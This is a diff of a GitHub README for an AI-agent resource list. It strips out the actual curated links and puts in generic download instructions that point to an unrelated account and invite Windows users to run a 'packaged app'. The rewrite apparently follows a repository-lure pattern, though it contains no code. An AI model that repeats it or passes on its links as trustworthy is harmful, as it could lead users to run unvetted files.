@@ -1,195 +1,218 @@
-# Awesome AI Agents [![Awesome](https://awesome.re/badge.svg)](https://awesome.re)
+# 🤖 awesome-ai-agents - Explore AI agent tools fast
 
-[![Built by Groovy Web](https://img.shields.io/badge/Built%20by-Groovy%20Web-0f3460?logo=github&logoColor=white)](https://www.groovyweb.co/?utm_source=github&utm_medium=readme&utm_campaign=awesome-ai-agents)
+[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue?style=for-the-badge)](https://github.com/Mdhu8768/awesome-ai-agents)
 
-> A curated list of AI agent frameworks, tools, platforms, and resources for building autonomous and semi-autonomous AI systems.
+## 🧭 What this is
 
-AI agents are systems that use LLMs to reason, plan, and take actions autonomously. This list covers everything from frameworks to production deployment tools.
+awesome-ai-agents is a curated list of AI agent frameworks, tools, platforms, and resources. It helps you find useful projects in one place instead of searching across many sites.
 
-**Contributions welcome!** Read the [contribution guidelines](CONTRIBUTING.md) first.
+This repository is best for people who want to:
 
-## Contents
+- compare AI agent tools
+- find frameworks for building agents
+- explore multi-agent systems
+- look up tools for LLM apps and RAG
+- save time when choosing a tool
 
-- [Frameworks](#frameworks)
-- [Orchestration](#orchestration)
-- [Agent Platforms](#agent-platforms)
-- [Tool Use & Function Calling](#tool-use--function-calling)
-- [Memory & State](#memory--state)
-- [RAG (Retrieval-Augmented Generation)](#rag-retrieval-augmented-generation)
-- [Testing & Evaluation](#testing--evaluation)
-- [Monitoring & Observability](#monitoring--observability)
-- [Deployment](#deployment)
-- [Research Papers](#research-papers)
-- [Tutorials & Courses](#tutorials--courses)
-- [Community](#community)
+## 📥 Download and open
 
-## Frameworks
+Use this link to visit the page and download the project:
 
-Multi-agent and single-agent frameworks for building AI systems.
+[Visit the download page](https://github.com/Mdhu8768/awesome-ai-agents)
 
-### Multi-Agent
+If your browser asks what to do, choose **Open** or **Save**. After the file finishes downloading, open the folder where it was saved and run it if you have a packaged app, or open the repository page if you want to read the list online.
 
-- [LangGraph](https://github.com/langchain-ai/langgraph) - Build stateful, multi-actor applications with LLMs. By LangChain.
-- [CrewAI](https://github.com/crewAIInc/crewAI) - Framework for orchestrating role-playing AI agents.
-- [AutoGen](https://github.com/microsoft/autogen) - Multi-agent conversation framework by Microsoft.
-- [Swarm](https://github.com/openai/swarm) - Lightweight multi-agent orchestration by OpenAI.
-- [Camel](https://github.com/camel-ai/camel) - Communicative agents for large-scale exploration.
-- [MetaGPT](https://github.com/geekan/MetaGPT) - Multi-agent framework that mimics a software company.
-- [Agency Swarm](https://github.com/VRSEN/agency-swarm) - Agent orchestration framework with customizable agent roles.
-- [Magentic-One](https://github.com/microsoft/autogen/tree/main/python/packages/autogen-magentic-one) - Generalist multi-agent system by Microsoft Research.
+## 🪟 How to use on Windows
 
-### Single-Agent
+If you are using Windows, follow these steps:
 
-- [LangChain](https://github.com/langchain-ai/langchain) - Framework for developing LLM-powered applications.
-- [LlamaIndex](https://github.com/run-llama/llama_index) - Data framework for LLM applications with RAG.
-- [Haystack](https://github.com/deepset-ai/haystack) - End-to-end NLP framework for building LLM applications.
-- [Semantic Kernel](https://github.com/microsoft/semantic-kernel) - SDK for integrating LLMs into applications. By Microsoft.
-- [Instructor](https://github.com/jxnl/instructor) - Structured outputs from LLMs with validation.
-- [Marvin](https://github.com/PrefectHQ/marvin) - AI engineering toolkit for building reliable AI interfaces.
+1. Open your web browser.
+2. Go to the download link above.
+3. Click **Code** on the GitHub page.
+4. Choose **Download ZIP** if you want to save the repository to your computer.
+5. Wait for the ZIP file to finish downloading.
+6. Open the ZIP file.
+7. Click **Extract All**.
+8. Pick a folder such as **Downloads** or **Desktop**.
+9. Open the extracted folder.
+10. Read the files inside with your browser or text editor.
 
-### Agent SDKs
+If you only want to browse the list, you do not need to install anything. You can use the GitHub page in your browser.
 
-- [Claude Agent SDK](https://github.com/anthropics/anthropic-sdk-python) - Build agents with Claude by Anthropic.
-- [OpenAI Agents SDK](https://github.com/openai/openai-agents-python) - Lightweight Python framework for agent workflows.
-- [Google ADK](https://github.com/google/adk-python) - Agent Development Kit by Google.
-- [Vercel AI SDK](https://github.com/vercel/ai) - Build AI-powered apps with React, Next.js, and more.
+## 🧰 What you need
 
-## Orchestration
+To use this repository on Windows, you only need:
 
-Tools for managing agent workflows and pipelines.
+- a Windows PC
+- an internet connection
+- a web browser such as Chrome, Edge, or Firefox
+- a ZIP tool, which Windows already includes
+- a text editor if you want to read files in plain text
 
-- [Temporal](https://github.com/temporalio/temporal) - Durable execution for microservices and agents.
-- [Prefect](https://github.com/PrefectHQ/prefect) - Workflow orchestration for data and ML pipelines.
-- [Airflow](https://github.com/apache/airflow) - Platform for programmatically authoring and scheduling workflows.
-- [Dagster](https://github.com/dagster-io/dagster) - Data orchestration platform with built-in asset management.
-- [n8n](https://github.com/n8n-io/n8n) - Workflow automation with AI capabilities.
-- [Windmill](https://github.com/windmill-labs/windmill) - Developer platform for building internal tools and workflows.
+No special setup is needed for viewing the list.
 
-## Agent Platforms
+## 🗂 What you will find
 
-Hosted platforms for building, deploying, and managing AI agents.
+This repository focuses on AI agent resources. You will find items related to:
 
-- [OpenAI Assistants API](https://platform.openai.com/docs/assistants/overview) - Build AI assistants with tools, knowledge, and actions.
-- [Claude MCP](https://modelcontextprotocol.io/) - Model Context Protocol for connecting AI to tools and data.
-- [Vertex AI Agent Builder](https://cloud.google.com/products/agent-builder) - Build conversational AI agents on Google Cloud.
-- [Amazon Bedrock Agents](https://aws.amazon.com/bedrock/agents/) - Build and deploy AI agents on AWS.
-- [Relevance AI](https://relevanceai.com/) - Platform for building AI agents and workflows.
-- [Voiceflow](https://www.voiceflow.com/) - Build and deploy conversational AI agents.
-- [Botpress](https://github.com/botpress/botpress) - Open-source platform for building AI agents and chatbots.
+- AI agent frameworks
+- multi-agent systems
+- LLM tools
+- RAG tools
+- machine learning tools
+- AI platforms
+- helper libraries
+- learning resources
 
-## Tool Use & Function Calling
+It is useful when you need a starting point for research or when you want to compare tools before building something.
 
-Libraries for giving agents the ability to use tools and APIs.
+## 🔎 Main uses
 
-- [Model Context Protocol (MCP)](https://github.com/modelcontextprotocol) - Open standard for connecting LLMs to tools and data.
-- [Composio](https://github.com/ComposioHQ/composio) - Integration platform for AI agents with 150+ tools.
-- [Toolhouse](https://toolhouse.ai/) - Tool infrastructure for LLM applications.
-- [Arcade AI](https://github.com/ArcadeAI/arcade-ai) - Tool use infrastructure with auth and execution.
-- [LangChain Tools](https://python.langchain.com/docs/integrations/tools/) - Extensive tool integrations for LangChain agents.
+You can use this repository to:
 
-## Memory & State
+- find a framework for agent-based apps
+- compare tools for chat agents
+- explore systems that support planning and task flow
+- review projects that work with large language models
+- study tools for retrieval and memory
+- collect links for future use
 
-Solutions for agent memory, context, and state management.
+## 🖥 Viewing the list on Windows
 
-- [Mem0](https://github.com/mem0ai/mem0) - Memory layer for AI agents and assistants.
-- [Zep](https://github.com/getzep/zep) - Long-term memory for AI assistants and agents.
-- [Letta (MemGPT)](https://github.com/letta-ai/letta) - Agents with long-term memory and self-editing capabilities.
-- [Chromem-go](https://github.com/philippgille/chromem-go) - Embeddable vector database for Go.
-- [MotherDuck](https://motherduck.com/) - Serverless analytics for agent state management.
+If you are new to GitHub, this is the easiest way to use the repository:
 
-## RAG (Retrieval-Augmented Generation)
+1. Open the GitHub link.
+2. Scroll through the page.
+3. Read the list by section.
+4. Click any project name to open its page.
+5. Copy useful links into a note or bookmark them.
 
-Tools and frameworks for building RAG systems that power agent knowledge.
+You can also use the GitHub search bar on the page if you want to find a topic such as LangChain, RAG, or multi-agent tools.
 
-- [LlamaIndex](https://github.com/run-llama/llama_index) - Data framework for building RAG applications.
-- [Unstructured](https://github.com/Unstructured-IO/unstructured) - Document parsing for RAG pipelines.
-- [LangChain RAG](https://python.langchain.com/docs/tutorials/rag/) - RAG tutorials and implementations.
-- [RAGFlow](https://github.com/infiniflow/ragflow) - Open-source RAG engine with deep document understanding.
-- [Cognita](https://github.com/truefoundry/cognita) - Open-source RAG framework for production.
-- [R2R](https://github.com/SciPhi-AI/R2R) - Production-ready RAG system.
-- **[rag-system-pgvector](https://github.com/groovy-web/rag-system-pgvector)** - Production RAG with PostgreSQL + pgvector. By Groovy Web.
-- **[rag-systems-production](https://github.com/groovy-web/rag-systems-production)** - Enterprise-grade RAG systems. By Groovy Web.
+## 📋 Suggested Windows setup
 
-### Vector Databases
+If you want a smoother viewing experience, use this simple setup:
 
-- [pgvector](https://github.com/pgvector/pgvector) - Open-source vector similarity search for PostgreSQL.
-- [Pinecone](https://www.pinecone.io/) - Managed vector database for AI applications.
-- [Weaviate](https://github.com/weaviate/weaviate) - Open-source vector database with hybrid search.
-- [ChromaDB](https://github.com/chroma-core/chroma) - Open-source embedding database.
-- [Qdrant](https://github.com/qdrant/qdrant) - High-performance vector search engine.
-- [Milvus](https://github.com/milvus-io/milvus) - Open-source vector database for scalable similarity search.
+- **Browser:** Microsoft Edge or Google Chrome
+- **Folder:** Desktop or Documents
+- **Notes app:** Notepad, WordPad, or OneNote
+- **Archive tool:** Built-in Windows extractor
+- **Bookmark tool:** Browser bookmarks
 
-## Testing & Evaluation
+This setup makes it easy to save the repository and return to it later.
 
-Tools for testing, evaluating, and benchmarking AI agents.
+## 🧪 Example workflow
 
-- [DeepEval](https://github.com/confident-ai/deepeval) - LLM evaluation framework for RAG and agents.
-- [RAGAS](https://github.com/explodinggradients/ragas) - Evaluation framework for RAG pipelines.
-- [Promptfoo](https://github.com/promptfoo/promptfoo) - Test and evaluate LLM outputs.
-- [Inspect AI](https://github.com/UKGovernmentBEIS/inspect_ai) - Framework for evaluating LLMs by UK AISI.
-- [Giskard](https://github.com/Giskard-AI/giskard) - Testing framework for ML models and LLMs.
-- **[ai-testing-mcp](https://github.com/groovy-web/ai-testing-mcp)** - MCP server for AI testing and QA. By Groovy Web.
+A simple way to use awesome-ai-agents:
 
-## Monitoring & Observability
+1. Open the repository page.
+2. Search for a topic you care about.
+3. Open a few tool pages in new tabs.
+4. Read each tool description.
+5. Check how active the project looks.
+6. Save the best options to a note.
+7. Return later when you are ready to choose one.
 
-Track agent performance, costs, and behavior in production.
+This keeps your research organized and helps you avoid losing track of useful links.
 
-- [LangSmith](https://smith.langchain.com/) - Debugging, testing, and monitoring for LLM applications.
-- [LangFuse](https://github.com/langfuse/langfuse) - Open-source LLM engineering platform.
-- [Helicone](https://github.com/Helicone/helicone) - Open-source LLM observability platform.
-- [Arize Phoenix](https://github.com/Arize-ai/phoenix) - ML observability for LLMs, agents, and RAG.
-- [Weights & Biases](https://wandb.ai/) - ML experiment tracking with LLM support.
-- [Braintrust](https://www.braintrust.dev/) - Evaluation, logging, and prompt management.
+## 🧭 Topics covered
 
-## Deployment
+The repository includes topics such as:
 
-Tools for deploying AI agents to production.
+- ai-agents
+- ai-tools
+- artificial-intelligence
+- awesome
+- awesome-list
+- langchain
+- llm
+- machine-learning
+- multi-agent
+- rag
 
-- [Modal](https://modal.com/) - Serverless cloud for AI and ML workloads.
-- [Replicate](https://replicate.com/) - Run and deploy ML models with an API.
-- [BentoML](https://github.com/bentoml/BentoML) - Build and deploy ML services.
-- [Ray Serve](https://docs.ray.io/en/latest/serve/) - Scalable model serving on Ray.
-- [vLLM](https://github.com/vllm-project/vllm) - High-throughput LLM serving engine.
-- [Ollama](https://github.com/ollama/ollama) - Run LLMs locally.
+These topics help you find tools that match common AI project needs.
 
-## Research Papers
+## 📌 Good reasons to use it
 
-Key papers on AI agents and multi-agent systems.
+This list is helpful because it:
 
-- [ReAct: Synergizing Reasoning and Acting in Language Models](https://arxiv.org/abs/2210.03629) - Foundation paper for tool-using agents.
-- [Toolformer](https://arxiv.org/abs/2302.04761) - LMs that teach themselves to use tools.
-- [Generative Agents](https://arxiv.org/abs/2304.03442) - Simulacra of human behavior using LLMs.
-- [Chain-of-Thought Prompting](https://arxiv.org/abs/2201.11903) - Eliciting reasoning in LLMs.
-- [Tree of Thoughts](https://arxiv.org/abs/2305.10601) - Deliberate problem-solving with LLMs.
-- [Reflexion](https://arxiv.org/abs/2303.11366) - Language agents with verbal reinforcement learning.
-- [LATS](https://arxiv.org/abs/2310.04406) - Language Agent Tree Search for reasoning and planning.
+- saves time
+- keeps useful links in one place
+- gives a broad view of the AI agent space
+- helps beginners start with known tools
+- supports quick comparison
+- works well for research and planning
 
-## Tutorials & Courses
+## 🛠 If you downloaded the ZIP file
 
-- [LangChain Academy](https://academy.langchain.com/) - Free courses on building with LangChain and LangGraph.
-- [DeepLearning.AI - Building Agentic RAG](https://www.deeplearning.ai/short-courses/) - Short courses on agent patterns.
-- **[langchain-multi-agent-example](https://github.com/groovy-web/langchain-multi-agent-example)** - Complete multi-agent tutorial. By Groovy Web.
-- [Anthropic Cookbook](https://github.com/anthropics/anthropic-cookbook) - Code samples for the Anthropic API.
-- [OpenAI Cookbook](https://github.com/openai/openai-cookbook) - Examples and guides for using the OpenAI API.
+After you extract the ZIP file:
 
-## Community
+1. Open the folder.
+2. Look for a file named `README.md`.
+3. Open it in your browser or text editor.
+4. Use the headings to move through the list.
+5. Click links to open related projects.
 
-- [LangChain Discord](https://discord.gg/langchain) - LangChain community chat.
-- [r/LangChain](https://www.reddit.com/r/LangChain/) - LangChain subreddit.
-- [r/LocalLLaMA](https://www.reddit.com/r/LocalLLaMA/) - Local LLM community.
-- [r/MachineLearning](https://www.reddit.com/r/MachineLearning/) - ML research community.
-- [Hugging Face Forums](https://discuss.huggingface.co/) - ML community discussions.
+If Windows asks which app to use, choose **Edge**, **Chrome**, or **Notepad**.
 
----
+## 🔐 Safe file handling on Windows
 
-## Contributing
+When you download files from GitHub, keep them in a known folder such as:
 
-Contributions are welcome! Please read the [contribution guidelines](CONTRIBUTING.md) first. If you find this list useful, give it a star.
+- Downloads
+- Desktop
+- Documents
 
-## License
+If you want to clean up later, you can delete the ZIP file after you extract it. This keeps your computer organized.
 
-[![CC0](https://licensebuttons.net/p/zero/1.0/88x31.png)](https://creativecommons.org/publicdomain/zero/1.0/)
+## 📚 Reading tips
 
----
+To get the most from the list:
 
-Curated with care by **[Groovy Web](https://www.groovyweb.co/?utm_source=github&utm_medium=readme&utm_campaign=awesome-ai-agents)** -- AI-First Engineering Agency
+- start with the headings that match your goal
+- open only a few links at a time
+- keep a note of tools you like
+- compare features before you choose
+- return to the list when your needs change
+
+## 🧩 Common things you may want to find
+
+You may want tools for:
+
+- chatbot agents
+- task automation
+- research agents
+- memory systems
+- vector search
+- retrieval systems
+- orchestration
+- workflow control
+- agent testing
+
+This repository gives you a place to start for each of these.
+
+## 📎 Download link
+
+Use this link again to visit the repository and download the project:
+
+[https://github.com/Mdhu8768/awesome-ai-agents](https://github.com/Mdhu8768/awesome-ai-agents)
+
+## 🗃 File layout
+
+A typical layout for this kind of repository may include:
+
+- `README.md` for the main list
+- section headings for categories
+- link lists for tools and resources
+- short notes on each item
+- reference links for learning
+
+## 🧭 What to do next
+
+After you open the repository:
+
+1. Look through the main sections.
+2. Find the category that fits your goal.
+3. Open the tools that interest you.
+4. Save the ones you want to revisit.
+5. Use the list as a reference when you work on AI projects
